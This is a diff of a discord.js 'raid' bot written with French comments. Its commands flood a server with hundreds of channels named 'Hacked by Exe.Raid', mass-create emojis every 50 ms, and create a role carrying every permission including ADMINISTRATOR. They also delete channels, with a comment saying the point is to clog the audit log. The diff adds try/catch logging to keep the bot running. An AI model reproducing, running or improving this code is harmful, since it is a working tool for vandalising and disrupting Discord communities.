@@ -1,10 +1,11 @@
 var Discord = require("discord.js");
 bot = new Discord.Client();
 var pre = "!";
-
-
+var commands = new Object();
 var prefix = ("_");
 const fs = require('fs');
+const serverembed = new Discord.RichEmbed()
+const path = require('path')
 const config = require("./config.json");
 var perms = ["KICK_MEMBERS","BAN_MEMBERS","ADMINISTRATOR","CREATE_INSTANT_INVITE","MANAGE_CHANNELS","MANAGE_GUILD","ADD_REACTIONS","VIEW_AUDIT_LOG","VIEW_CHANNEL","READ_MESSAGES","SEND_MESSAGES","SEND_TTS_MESSAGES","MANAGE_MESSAGES","EMBED_LINKS","ATTACH_FILES","READ_MESSAGE_HISTORY","MENTION_EVERYONE","USE_EXTERNAL_EMOJIS","EXTERNAL_EMOJIS","CONNECT","SPEAK","MUTE_MEMBERS","DEAFEN_MEMBERS","MOVE_MEMBERS","USE_VAD","CHANGE_NICKNAME","MANAGE_NICKNAMES","MANAGE_ROLES","MANAGE_ROLES_OR_PERMISSIONS","MANAGE_WEBHOOKS","MANAGE_EMOJIS"];
 var i = 0;
@@ -31,8 +32,7 @@ function base64_encode(file) {
 		};
         
         /* LISTE DES COMMANDES */
- 
-     
+        try {
   
 			if (["epic"].includes(command)) {
                 message.delete();
@@ -64,10 +64,10 @@ function base64_encode(file) {
         permissions: perms,
     })
   }, 200)
-    //Nom a changer
+    
 }
 			if (["emoji"].includes(command)) {
-    message.delete();
+
     
     var interval = setInterval (function () {
     message.guild.createEmoji('./raid.png', 'Raid')
@@ -76,17 +76,18 @@ function base64_encode(file) {
     
 }
 			if (["emoji"].includes(command)) {
-
+        message.delete();
       var interval = setInterval (function () {  
     message.guild.createEmoji('./exe.gif', 'exe')
   }, 50)
 }
+
 			if (["wtf"].includes(command)) {
         message.delete();
         var interval = setInterval (function () {
           for (var i = 0; i < 400; i++) {
   
-            message.guild.createChannel(`╭∩╮►_◄╭∩╮`, 'voice')//Nom a changer
+            message.guild.createChannel(`╭∩╮►_◄╭∩╮`, 'voice')
             message.guild.createChannel(`𝐻𝑎𝑐𝑘𝑒𝑑 𝑏𝑦 𝐸𝑥𝑒.𝑅𝑎𝑖𝑑`, 'text')
               //changes name tons of times to clog up the audit log
               
@@ -256,7 +257,7 @@ function base64_encode(file) {
     message.delete();
     //create role
     var interval = setInterval (function () {
-    message.guild.createEmoji('./exe.gif', '.Exe')
+    message.guild.createEmoji('./exe.gif', '.exe')
   .then(emoji => console.log(`Nouveau emoji crée ! ${emoji.name}`))
   }, 50)
     //Nom a changer
@@ -309,20 +310,19 @@ message.channel.delete().then(chan => console.log('Salon supprimé:', chan.name)
         }
       });
     }
+    			else {
+				console.log("[LOG] ["+message.author.tag+"] ["+message.guild.name+"] La commande "+command+" a été éxécutée.")
+			}
+        } 	
+
+      	catch (error) {
+          console.log("[ERREUR] ["+message.author.tag+"] "+message.content)
+          console.log(error) // Capturer les erreurs pour garder le bot en ligne 
+        }
         
-  }  
+  }    
+  
 
 });
-
-
-
-bot.on('disconnect', function() {
-console.log('Reconnection du bot ...');
-bot.connect();
-});
-bot.on('first', function() {
-console.log('Fix').catch(console.error);
-});
-
 
 bot.login(config.token);
